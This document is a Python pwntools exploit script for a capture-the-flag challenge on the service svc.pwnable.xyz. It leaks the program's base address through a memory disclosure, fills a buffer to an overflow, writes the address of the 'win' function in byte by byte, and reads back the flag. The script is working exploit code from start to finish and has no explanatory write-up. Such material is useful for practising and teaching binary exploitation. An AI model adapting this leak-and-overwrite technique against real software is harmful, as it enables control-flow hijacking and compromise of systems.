from pwn import *
from pwnlib.ui import pause

# p = process('./challenge')
p = remote('svc.pwnable.xyz', 30014)
elf = ELF('./challenge')

base = 0
leaked = False
counter = 0

while 1:
    p.sendlineafter('> ','2')
    num = p.recvuntil(':').split(b' ')[-2]
    if num != b'0.':
        num = int(num)
        if num > 0:
            if leaked == False:
                if num >= 14:
                    p.send('a'*8)
                    counter += 14
                    p.sendlineafter('> ','3')
                    p.recvuntil('a'*8)
                    base = u64(p.recv(6).ljust(8, b'\x00')) - 0xbc2
                    success('base = 0x%x', base)
                    leaked = True
                    continue
            if leaked == False:
                p.send('\x00')
            else:
                if counter > 1020:
                    p.send(b'a'*1+b'\x00'*(num-1))
                    counter += 1
                    success(f'padding {counter} words')
                else:
                    p.send(b'a'*(num-1)+b'\x00')
                    counter += (num-1)
                    success(f'padding {counter} words')
    if counter == 1032:
        break

win = base + elf.sym['win']
success('win = 0x%x', win)

while 1:
    if win == 0:
        break
    p.sendlineafter('> ','2')
    num = p.recvuntil(':').split(b' ')[-2]
    if num != b'0.':
        p.send(p8(win&0xff))
        win >>= 8

p.sendlineafter('> ','0')
print(p.recvuntil('}'))